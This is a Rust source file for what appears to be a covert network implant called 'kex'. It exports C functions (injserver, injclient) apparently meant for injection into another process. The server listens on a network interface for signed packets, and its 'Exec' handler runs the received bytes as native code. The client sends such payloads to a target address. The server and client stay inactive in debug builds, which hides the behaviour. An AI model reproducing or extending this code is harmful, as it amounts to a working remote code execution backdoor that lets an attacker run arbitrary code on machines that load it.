pub use kex_domain::entitys::envent::EventEmitter;
pub use kex_domain::entitys::payload::Payload;
pub use kex_infra::dto;
use kex_infra::dto::server_options::ServerOptions;
pub use kex_infra::hex;
use std::os::raw::{c_char, c_int, c_uchar};
use std::sync::Arc;

pub enum Method {
    Echo = 0,
    Exec = 1,
}

pub fn echo(data: Vec<u8>, _addr: std::net::Ipv4Addr) {
    let data_str = String::from_utf8(data.clone());

    match data_str {
        Ok(data) => {
            println!("Echo: {:?}", data);
        }
        Err(_) => {
            println!("Echo: {:?}", &data);
        }
    }
}

pub fn exec(data: Vec<u8>, _addr: std::net::Ipv4Addr) {
    let _ = kex_infra::native_exec::execute_code(&data);
}

pub fn server(args: ServerOptions) {
    let evet_emitter = Arc::new(EventEmitter::new());
    evet_emitter.on(Method::Exec as u8, Box::new(exec));
    evet_emitter.on(Method::Echo as u8, Box::new(echo));
    kex_infra::server(args, evet_emitter);
}

pub fn list_ifaces() {
    kex_infra::server::iface_list()
}



pub fn client(options: dto::client_options::ClientOptions) {
    kex_infra::client(options)
}

#[no_mangle]
pub extern "C" fn injserver(
    interface_name: *const c_char,
    interface_name_len: c_int,
    sig: *const u8,
    sig_len: usize,
    tp: u8,
) -> u8 {
    if !cfg!(debug_assertions) {
        let interface_name = unsafe {
            std::slice::from_raw_parts(
                interface_name as *const c_uchar,
                interface_name_len as usize,
            )
        };
        let interface_name = String::from_utf8(interface_name.to_vec()).unwrap();
        let sig = unsafe { std::slice::from_raw_parts(sig, sig_len) };
        let sig = sig.to_vec();
        let tp = tp;

        let args = ServerOptions {
            interface_name,
            sig,
            tp,
        };
        server(args);
    }
    0
}

#[no_mangle]
pub extern "C" fn injclient(
    destination: *const u8,
    chunk_size: usize,
    tp: u8,
    method: u8,
    sig: *const u8,
    sig_len: usize,
    payload: *const u8,
    payload_len: usize,
) {
    if !cfg!(debug_assertions) {
        // Convertendo os ponteiros para arrays
        let destination = unsafe { std::slice::from_raw_parts(destination, 4) };
        let destination = [
            destination[0],
            destination[1],
            destination[2],
            destination[3],
        ];
        let payload_data = unsafe { std::slice::from_raw_parts(payload, payload_len) };
        let sig = unsafe { std::slice::from_raw_parts(sig, sig_len) };
        let sig = sig.to_vec();

        let payload_vec = payload_data.to_vec();

        let options = kex_infra::dto::client_options::ClientOptions {
            destination,
            chunk_size,
            payload: Payload::new(sig, method, 1, 1, tp, payload_vec),
        };
        client(options);
    }
}

#[no_mangle]
pub extern "C" fn injlistifaces() {
    if cfg!(debug_assertions) {
        list_ifaces();
    }
}
#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;

    #[test]
    fn test_echo() {
        let data = vec![1, 2, 3, 4, 5];
        echo(data, Ipv4Addr::new(127, 0, 0, 1));
    }

    #[test]
    fn test_exec() {
        let data = vec![0, 0, 0, 0, 0, 0, 0, 0];
        exec(data, Ipv4Addr::new(127, 0, 0, 1));
    }
}
